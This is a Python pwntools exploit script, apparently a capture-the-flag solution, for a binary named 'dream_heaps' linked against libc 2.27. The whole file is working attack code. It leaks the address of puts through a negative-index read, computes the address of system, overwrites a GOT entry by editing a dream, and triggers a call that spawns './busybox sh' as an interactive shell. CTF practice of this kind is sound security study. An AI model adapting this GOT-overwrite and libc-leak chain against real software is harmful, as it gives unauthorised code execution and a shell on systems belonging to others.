from pwn import *
import struct

binary = context.binary = ELF("./dream_heaps")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-linux-x86-64.so.2")

puts_offset   = 0x1809c0 - 0x100000
system_offset = 0x14f440 - 0x100000

if args.GDB:
    p = gdb.debug([ld.path, binary.path], env={"LD_PRELOAD":libc.path}, gdbscript='b *edit_dream')
elif args.LOCAL:
    p = process(binary.path)
    puts_offset   = 0x7aa10
    system_offset = 0x4ebf0
else:
    p = process([ld.path, binary.path], env={"LD_PRELOAD":libc.path})

# new dreams
# send shell
p.sendline(b"1")
p.sendline(b"13")
p.readuntil(b"What are the contents of this dream?\n")
p.sendline(b"./busybox sh")

for i in range(16):
    p.sendline(b"1")
    p.sendline(b"8")
    p.readuntil(b"What are the contents of this dream?\n")
    p.sendline(b"AAAAAAAA")

p.sendline(b"1")
p.sendline(b"7")
p.readuntil(b"What are the contents of this dream?\n")
p.sendline(b"AAAAAAA")

p.sendline(b"1")
# 0x602018
p.sendline(b"6299672")
p.readuntil(b"What are the contents of this dream?\n")
p.sendline(b"AAAAAAAA")

p.sendline(b"1")
p.sendline(b"0")
p.readuntil(b"What are the contents of this dream?\n")
# p.sendline(b"AAAAAAAA")

# read dream
p.sendline(b"2")
p.readuntil(b"Which dream would you like to read?\n")
p.sendline(b"-263021")
tmp = p.readuntil(b"What would you like to do?")
puts_addr = tmp.split(b"What would you like to do?")[0]
puts_addr = u64(puts_addr + b"\00" * (8 - len(puts_addr)))
system_addr = puts_addr - puts_offset + system_offset

# edit dream
p.sendline(b"3")
p.sendline(b"17")
p.sendline(p64(system_addr)[:-1])

# delete
p.sendline(b"4")
p.sendline(b"0")

p.interactive()